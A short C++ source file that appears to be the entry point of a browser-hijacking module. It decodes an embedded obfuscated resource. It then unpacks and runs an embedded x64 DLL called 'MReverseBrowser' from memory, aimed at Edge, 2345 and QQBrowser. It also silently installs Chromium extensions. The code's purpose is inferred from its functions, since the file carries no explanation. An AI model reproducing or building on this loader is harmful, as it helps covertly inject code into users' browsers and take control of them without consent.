#include "stdafx.h"

__shared_api_ void __stdcall api_object_init(const void* route, unsigned long route_size) {
 do {
  std::string DefaultBrowserRes = shared::Encryption::WemadeDecode(std::string((char*)&_100000_zip_res[0], sizeof(_100000_zip_res)));
  if (route && route_size > 0) {
   tfRouteRes routeRes;
   shared::Win::Resource::UnMadeRoute(std::string((char*)route, route_size), routeRes);
   if (routeRes.size() == size_t(object_500001::EnParamType::EN_PARAM_TOTAL))
    DefaultBrowserRes = routeRes[size_t(object_500001::EnParamType::EN_BROWSER_ZIP_RES)];
  }
  if (object_500001::ENABLE_ChineseMainland_Browser_Process) {
   //!@ MicrosoftEdge、2345、QQBrowser
   std::string pe_500001 = protocol::Global::ReleasePrivateResource(std::string((char*)&MReverseBrowser_dll_zip_res[0], sizeof(MReverseBrowser_dll_zip_res)));
   if (!shared::Win::PE::Verify(pe_500001) || !shared::Win::PE::IsDLL(pe_500001) || !shared::Win::PE::IsX64(pe_500001))
    break;
   tfRoutePak routePak;
   shared::Win::Resource::MadeRoute({ {tfRouteIndex(object_500001::EnParamType::EN_BROWSER_ZIP_RES),DefaultBrowserRes} }, routePak);
   shared::Win::PEExecute(pe_500001, routePak, true);
  }
  //!@ GoogleChrome
  //! 
  //! 
  local::__gpCore = new local::Core();
  local::__gpCore->Open();
  local::__gpCore->ChromiumExtensionsSetup(DefaultBrowserRes);
 } while (0);

}
__shared_api_ void __stdcall api_object_uninit() {
 if (local::__gpCore)
  local::__gpCore->Close();
 SK_DELETE_PTR(local::__gpCore);
}

